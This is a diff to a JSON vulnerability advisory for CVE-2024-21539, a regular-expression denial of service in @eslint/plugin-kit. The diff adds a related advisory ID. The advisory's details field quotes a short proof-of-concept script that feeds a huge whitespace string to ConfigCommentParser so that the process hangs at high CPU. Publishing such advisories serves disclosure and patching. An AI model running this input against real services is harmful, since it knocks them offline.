@@ -6,6 +6,9 @@
 	"aliases": [
 		"CVE-2024-21539"
 	],
+	"related": [
+		"CGA-v55f-9838-wrpj"
+	],
 	"summary": "Regular Expression Denial of Service (ReDoS) in @eslint/plugin-kit",
 	"details": "Crafting a very large and well crafted string can increase the CPU usage and crash the program.\n\n## POC\n\n```js\nconst { ConfigCommentParser } = require(\"@eslint/plugin-kit\");\n\nvar str = \"\";\nfor (var i = 0; i < 1000000; i++) {\n  str += \" \";\n}\nstr += \"A\";\n\nconsole.log(\"start\")\nvar parser = new ConfigCommentParser();\nconsole.log(parser.parseStringConfig(str, \"\"));\nconsole.log(\"end\")\n\n// run `npm i @eslint/plugin-kit` and `node attack.js` \n// then the program will stuck forever with high CPU usage\n```",
 	"affected": [
